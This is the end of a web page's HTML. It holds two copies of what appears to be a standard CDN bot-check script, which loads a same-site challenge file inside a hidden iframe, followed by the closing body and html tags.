    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'921486cb3f27bd3a',t:'MTc0MjEzMTAwMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92151552be9cbf8c',t:'MTc0MjEzNjg0MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>

</html>